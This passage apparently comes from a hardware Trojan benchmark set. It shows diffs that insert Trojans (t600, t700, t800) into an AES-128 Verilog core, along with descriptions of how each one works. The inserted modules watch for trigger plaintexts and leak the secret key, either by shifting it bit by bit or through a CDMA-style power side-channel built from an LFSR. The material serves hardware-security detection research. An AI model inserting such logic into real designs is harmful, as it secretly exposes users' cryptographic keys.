+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/tb_AM.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: AM_Transmission
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tb_TSC;
+
+	// Inputs
+	reg [127:0] key;
+	reg clk;
+	reg rst;
+	reg Tj_Trig;
+	
+	// Instantiate the Unit Under Test (UUT)
+	TSC uut (
+    .clk(clk),
+    .rst(rst),
+	 .key(key),
+	 .Tj_Trig(Tj_Trig)
+    );
+
+	initial begin
+		// Initialize Inputs
+		key = 0;
+		clk = 0;
+		rst = 0;
+		Tj_Trig = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;
+		Tj_Trig = 1;
+		key = 128&apos;hAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
+		// Add stimulus here
+		#25
+		Tj_Trig = 0;
+		rst = 0;
+		#300 $finish;
+	end
+	
+   always #5 clk = ~clk;
+endmodule
+
diff -rupN aes/src/tjfree/test_aes_128.v aes/src/tjin-t600/test_aes_128.v
--- aes/src/tjfree/test_aes_128.v	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t600/test_aes_128.v	1970-01-01 01:00:00.000000000 +0100
@@ -1,85 +0,0 @@
-/*
- * Copyright 2012, Homer Hsing &lt;homer.hsing@gmail.com&gt;
- *
- * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
- */
-
-`timescale 1ns / 1ps
-
-module test_aes_128;
-
-	// Inputs
-	reg clk;
-	reg [127:0] state;
-	reg [127:0] key;
-
-	// Outputs
-	wire [127:0] out;
-
-	// Instantiate the Unit Under Test (UUT)
-	aes_128 uut (
-		.clk(clk), 
-		.state(state), 
-		.key(key), 
-		.out(out)
-	);
-
-	initial begin
-		clk = 0;
-		state = 0;
-		key = 0;
-
-		#100;
-        /*
-         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
-         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
-         */
-        @ (negedge clk);
-        # 2;
-        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
-        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
-        #10;
-        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
-        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h0;
-        #10;
-        state = 128&apos;h0;
-        key   = 128&apos;h1;
-        #10;
-        state = 128&apos;h1;
-        key   = 128&apos;h0;
-        #170;
-        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
-          begin $display(&quot;E&quot;); $finish; end
-        #10;
-        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
-          begin $display(&quot;E&quot;); $finish; end
-        $display(&quot;Good.&quot;);
-        $finish;
-	end
-      
-    always #5 clk = ~clk;
-endmodule
-
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t600/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t600/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,30 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:35:35 03/08/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(clk, rst, state, key, out);
+    input          clk, rst;
+    input  [127:0] state, key;
+    output [127:0] out;
+
+		aes_128 AES (clk, state, key, out);
+		Trojan_Trigger Trigger(rst, clk, state, Tj_Trig);
+		TSC Trojan (clk, rst, key, Tj_Trig);
+
+endmodule
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t600/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t600/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,53 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input clk,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+	reg tempClk1, tempClk2;
+	reg Detected;
+	
+	always @(tempClk1, tempClk2)
+	begin
+		Tj_Trig &lt;= tempClk1 | tempClk2;
+	end
+	
+	// Tj_Trig is high for two clock cycles
+	always @(posedge clk)
+	begin
+		if (rst == 1)	begin tempClk1 &lt;= 1; tempClk2 &lt;= 0; end
+		else if ((tempClk1 == 1) &amp;&amp; (Detected == 1))	begin tempClk1 &lt;= 0; tempClk2 &lt;= 1;	end
+		else if ((tempClk1 == 0) &amp;&amp; (tempClk2 == 1))	begin tempClk2 &lt;= 0;	end		
+		else begin tempClk1 &lt;= 0; tempClk2 &lt;= 0; end
+	end
+
+	always @(state)
+	begin
+		if (state == 128&apos;hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)	
+			Detected &lt;= 1; 
+		else 
+			Detected &lt;= 0; 
+	end
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t600/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t600/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,66 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    18:18:26 03/08/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input clk,
+    input rst,
+	 input [127:0] key,
+	 input Tj_Trig
+    );
+
+	 reg [127:0] SECRETKey;
+	 reg [127:0] COUNTER;
+	 reg LEAKBit;	 
+	 wire INV1_out, INV2_out, INV3_out, INV4_out, INV5_out, INV6_out, INV7_out, INV8_out, INV9_out, INV10_out, INV11_out;
+	 
+	 always @(rst, clk)
+	 begin
+			if (rst == 1)
+				COUNTER &lt;= 0;
+			else
+				COUNTER &lt;= COUNTER + 1;
+	 end
+
+	 always @(posedge Tj_Trig, posedge COUNTER[127])
+	 begin
+			if (Tj_Trig == 1)
+				SECRETKey &lt;= key;
+			else
+				SECRETKey &lt;= SECRETKey &gt;&gt; 1;
+	 end
+
+	 always @ (SECRETKey)
+	 begin
+			LEAKBit &lt;= SECRETKey[0];
+	 end
+
+	 assign INV1_out = ~(LEAKBit);
+	 assign INV2_out = ~(INV1_out);
+	 assign INV3_out = ~(INV1_out);
+	 assign INV4_out = ~(INV1_out);
+	 assign INV5_out = ~(INV1_out);
+	 assign INV6_out = ~(INV1_out);
+	 assign INV7_out = ~(INV1_out);
+	 assign INV8_out = ~(INV1_out);
+	 assign INV9_out = ~(INV1_out);
+	 assign INV10_out = ~(INV1_out);
+	 assign INV11_out = ~(INV1_out);
+	 
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="a23395c7-f877-4d77-9fbe-db32e4ae280e" name="t700" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Whenever a predefined input plaintext is observed, the Trojan leaks the secret key from a cryptographic chip running 
	the AES algorithm through a covert channel. The channel adapts the concepts from spread spectrum communications 
	(also known as Code-Division Multiple Access (CDMA)) to distribute the leakage of single bits over many clock cycles. 
	The Trojan employs this method by using a pseudo-random number generator (PRNG) to create a CDMA code sequence, 
	the PRNG initialized to a predefined value. The code sequence is then used to XOR modulate the secret information bits. 
	The modulated sequence is forwarded to a leakage circuit (LC) to set up a covert CDMA channel in the power side-channel. 
	The LC is realized by connecting eight identical flip-flop elements to the single output of the XOR gate to mimic 
	a large capacitance [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t700/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t700/lfsr_counter.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,26 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+		
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			//lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+			lfsr_stream &lt;= 20&apos;h99999;
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end else begin
+				lfsr_stream &lt;= lfsr_stream ;
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t700/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t700/lfsr.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,26 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+		
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			//lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+			lfsr_stream &lt;= 20&apos;h99999;
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end else begin
+				lfsr_stream &lt;= lfsr_stream ;
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t700/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t700/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,102 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Capacitance(Capacitance)
+	);
+
+	initial begin		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+        * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+        * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+        * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+        */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t700/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t700/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,36 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top ( 
+		 input clk, 
+		 input rst, 
+		 input [127:0] state, 
+		 input [127:0] key, 
+		 output [127:0] out, 
+		 output [63:0] Capacitance 
+    ); 
+ 
+	wire Tj_Trig; 
+	
+	aes_128 AES (clk, state, key, out); 
+	Trojan_Trigger Trigger (rst, state, Tj_Trig); 
+	TSC Trojan (rst, clk, Tj_Trig, key, Capacitance); 
+ 
+endmodule 
\ No newline at end of file
diff -rupN aes/src/tjfree/trojan_trigger.v aes/src/tjin-t700/trojan_trigger.v
--- aes/src/tjfree/trojan_trigger.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t700/trojan_trigger.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,38 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    13:40:39 03/08/2013 
+// Design Name: 
+// Module Name:    Trojan_Trigger 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module Trojan_Trigger(
+    input rst,
+    input [127:0] state,
+    output Tj_Trig
+    );
+
+	reg Tj_Trig;
+
+	always @(rst, state)
+	begin
+		if (rst == 1) begin
+			Tj_Trig &lt;= 0; 
+		end else if (state == 128&apos;h00112233_44556677_8899aabb_ccddeeff) begin 
+			Tj_Trig &lt;= 1; 
+		end 
+	end
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t700/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t700/tsc.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,112 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+	 input Tj_Trig, 
+    input [127:0] key,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, Tj_Trig, counter);
+	always @ (posedge clk)
+		begin
+			if (rst == 1) begin
+				load &lt;= 0;
+			end else begin	
+				load[0] &lt;= key[0] ^ counter[0];	
+				load[1] &lt;= key[0] ^ counter[0];	
+				load[2] &lt;= key[0] ^ counter[0];	
+				load[3] &lt;= key[0] ^ counter[0];	
+				load[4] &lt;= key[0] ^ counter[0];	
+				load[5] &lt;= key[0] ^ counter[0];	
+				load[6] &lt;= key[0] ^ counter[0];	
+				load[7] &lt;= key[0] ^ counter[0];	
+				
+				load[8] &lt;= key[1] ^ counter[1];	
+				load[9] &lt;= key[1] ^ counter[1];	
+				load[10] &lt;= key[1] ^ counter[1];	
+				load[11] &lt;= key[1] ^ counter[1];	
+				load[12] &lt;= key[1] ^ counter[1];	
+				load[13] &lt;= key[1] ^ counter[1];	
+				load[14] &lt;= key[1] ^ counter[1];	
+				load[15] &lt;= key[1] ^ counter[1];	
+				
+				load[16] &lt;= key[2] ^ counter[2];	
+				load[17] &lt;= key[2] ^ counter[2];	
+				load[18] &lt;= key[2] ^ counter[2];	
+				load[19] &lt;= key[2] ^ counter[2];	
+				load[20] &lt;= key[2] ^ counter[2];	
+				load[21] &lt;= key[2] ^ counter[2];	
+				load[22] &lt;= key[2] ^ counter[2];	
+				load[23] &lt;= key[2] ^ counter[2];	
+				
+				load[24] &lt;= key[3] ^ counter[3];	
+				load[25] &lt;= key[3] ^ counter[3];	
+				load[26] &lt;= key[3] ^ counter[3];	
+				load[27] &lt;= key[3] ^ counter[3];	
+				load[28] &lt;= key[3] ^ counter[3];	
+				load[29] &lt;= key[3] ^ counter[3];	
+				load[30] &lt;= key[3] ^ counter[3];				
+				load[31] &lt;= key[3] ^ counter[3];				
+
+				load[32] &lt;= key[4] ^ counter[4];	
+				load[33] &lt;= key[4] ^ counter[4];	
+				load[34] &lt;= key[4] ^ counter[4];	
+				load[35] &lt;= key[4] ^ counter[4];	
+				load[36] &lt;= key[4] ^ counter[4];	
+				load[37] &lt;= key[4] ^ counter[4];	
+				load[38] &lt;= key[4] ^ counter[4];	
+				load[39] &lt;= key[4] ^ counter[4];	
+
+				load[40] &lt;= key[5] ^ counter[5];	
+				load[41] &lt;= key[5] ^ counter[5];	
+				load[42] &lt;= key[5] ^ counter[5];	
+				load[43] &lt;= key[5] ^ counter[5];	
+				load[44] &lt;= key[5] ^ counter[5];	
+				load[45] &lt;= key[5] ^ counter[5];	
+				load[46] &lt;= key[5] ^ counter[5];				
+				load[47] &lt;= key[5] ^ counter[5];				
+
+				load[48] &lt;= key[6] ^ counter[6];	
+				load[49] &lt;= key[6] ^ counter[6];				
+				load[50] &lt;= key[6] ^ counter[6];	
+				load[51] &lt;= key[6] ^ counter[6];	
+				load[52] &lt;= key[6] ^ counter[6];	
+				load[53] &lt;= key[6] ^ counter[6];	
+				load[54] &lt;= key[6] ^ counter[6];	
+				load[55] &lt;= key[6] ^ counter[6];
+				
+				load[56] &lt;= key[7] ^ counter[7];	
+				load[57] &lt;= key[7] ^ counter[7];	
+				load[58] &lt;= key[7] ^ counter[7];	
+				load[59] &lt;= key[7] ^ counter[7];	
+				load[60] &lt;= key[7] ^ counter[7];	
+				load[61] &lt;= key[7] ^ counter[7];	
+				load[62] &lt;= key[7] ^ counter[7];	
+				load[63] &lt;= key[7] ^ counter[7];				
+			end
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="dd38bc48-c151-45d5-9f1e-158ae1c646b0" name="t800" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Once a predefined sequence of input plaintext is observed, the Trojan leaks the secret key from a cryptographic chip  
	running the AES algorithm through a covert channel. The channel adapts the concepts from spread spectrum communications 
	(also known as Code-Division Multiple Access (CDMA)) to distribute the leakage of single bits over many clock cycles. 
	The Trojan employs this method by using a pseudo-random number generator (PRNG) to create a CDMA code sequence, 
	the PRNG initialized to a predefined value. The code sequence is then used to XOR modulate the secret information bits. 
	The modulated sequence is forwarded to a leakage circuit (LC) to set up a covert CDMA channel in the power side-channel. 
	The LC is realized by connecting eight identical flip-flop elements to the single output of the XOR gate to mimic 
	a large capacitance [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Triggered Internally
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t800/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t800/lfsr_counter.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,24 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t800/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t800/lfsr.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,24 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, Tj_Trig,
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+		end else begin
+			if (Tj_Trig == 1) begin
+				lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+			end	
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/simulation.do aes/src/tjin-t800/simulation.do
--- aes/src/tjfree/simulation.do	2015-09-09 16:38:27.817921496 +0200
+++ aes/src/tjin-t800/simulation.do	1970-01-01 01:00:00.000000000 +0100
@@ -1,11 +0,0 @@
-vlib work
-vlog ../rtl/*.v
-vlog *.v
-vsim -novopt test_aes_128
-add wave -noupdate -format Logic -radix unsigned /test_aes_128/clk
-add wave -noupdate -divider input
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/state
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/key
-add wave -noupdate -divider output
-add wave -noupdate -format Literal -radix hexadecimal /test_aes_128/out
-run -all
diff -rupN aes/src/tjfree/tbtop.v aes/src/tjin-t800/tbtop.v
--- aes/src/tjfree/tbtop.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t800/tbtop.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,102 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   10:26:15 03/19/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES-T1001/AES/tbTOP.v
+// Project Name:  AES
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module tbTOP;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire [63:0] Capacitance;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Capacitance(Capacitance)
+	);
+
+	initial begin		clk = 0;
+		state = 0;
+		key = 0;
+		rst = 0;
+		
+		#20;
+		rst = 1;
+
+		#20;
+		rst = 0;
+		
+		#60;
+        /*
+         * TIMEGRP &quot;key&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;state&quot; OFFSET = IN 6.4 ns VALID 6 ns AFTER &quot;clk&quot; HIGH;
+         * TIMEGRP &quot;out&quot; OFFSET = OUT 2.2 ns BEFORE &quot;clk&quot; HIGH;
+         */
+        @ (negedge clk);
+        # 2;
+        state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+        key   = 128&apos;h2b7e1516_28aed2a6_abf71588_09cf4f3c;
+        #10;
+        state = 128&apos;h00112233_44556677_8899aabb_ccddeeff;
+        key   = 128&apos;h00010203_04050607_08090a0b_0c0d0e0f;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h0;
+        #10;
+        state = 128&apos;h0;
+        key   = 128&apos;h1;
+        #10;
+        state = 128&apos;h1;
+        key   = 128&apos;h0;
+        #170;
+        if (out !== 128&apos;h3925841d02dc09fbdc118597196a0b32)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h69_c4_e0_d8_6a_7b_04_30_d8_cd_b7_80_70_b4_c5_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h66_e9_4b_d4_ef_8a_2c_3b_88_4c_fa_59_ca_34_2b_2e)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h05_45_aa_d5_6d_a2_a9_7c_36_63_d1_43_2a_3d_1c_84)
+          begin $display(&quot;E&quot;); $finish; end
+        #10;
+        if (out !== 128&apos;h58_e2_fc_ce_fa_7e_30_61_36_7f_1d_57_a4_e7_45_5a)
+          begin $display(&quot;E&quot;); $finish; end
+        $display(&quot;Good.&quot;);
+        $finish;
+	end
+      
+    always #5 clk = ~clk;
+      
+endmodule
+
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t800/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t800/top.v	2015-08-21 12:09:52.000000000 +0200
@@ -0,0 +1,35 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
